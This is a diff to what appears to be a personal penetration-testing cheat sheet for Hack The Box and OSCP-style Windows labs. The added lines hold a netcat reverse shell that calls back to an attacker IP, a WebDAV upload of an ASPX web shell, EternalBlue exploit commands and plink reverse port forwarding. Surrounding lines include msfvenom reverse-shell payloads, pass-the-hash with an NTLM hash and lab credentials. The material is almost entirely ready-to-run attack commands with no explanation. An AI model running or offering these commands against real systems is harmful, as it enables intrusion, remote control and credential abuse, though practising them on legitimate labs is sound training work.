@@ -164,6 +164,11 @@ impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
 
 #### Shells
 ```Shell
+# impacket-smbserver folder $(pwd)   
+start /b \\10.10.14.7\folder\nc.exe -e cmd 10.10.14.7 443
+# nc -lvnp 443
+```
+```Shell
 root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
 10.10.10.8 - - [12/Jan/2022 21:58:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
 ```
@@ -193,18 +198,25 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
+#### WebDAV IIS 6
+```Shell
+cadaver 10.10.10.15 
+dav:/> put cmd.txt
+dav:/> move cmd.txt cmd.aspx
+```
+```Shell
+# davtest -url http://10.10.10.15
+```
 
 #### Eternalblue
 ```Shell
 wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
 python 42315.py 10.10.10.40
 ```
-
 ```Shell
 msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
 python 42315.py 10.10.10.40 samr exploit.exe 
 ```
-
 ```Shell
 git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
 python eternal_checker.py 10.10.10.40
@@ -215,8 +227,11 @@ python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin
 msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
 python eternalblue_exploit7.py 10.10.10.40 sc_x64_msf.bin
 ```
-
-
+https://github.com/worawit/MS17-010.git
+```Shell
+python checker.py 127.0.0.1
+python zzz_exploit.py 127.0.0.1 samr
+```
 
 ## Post Explotation
 
@@ -269,6 +284,18 @@ impacket-wmiexec 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
 ```Shell
 pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:d90b270062e8b9f118ab8e0f733df391 //10.10.10.8 cmd.exe
 ```
+
+#### PortForwarding
+```Shell
+impacket-smbserver folder $(pwd) 
+copy \\10.10.14.7\folder\plink.exe plink.exe
+plink.exe -P 445 -l root -pw <pwd> -R 4445:127.0.0.1:445 10.10.14.7
+#sshd_config
+KexAlgorithms +diffie-hellman-group1-sha1
+Ciphers +aes128-cbc
+```
+
+
 
 ## Priv
 https://github.com/SecWiki/windows-kernel-exploits
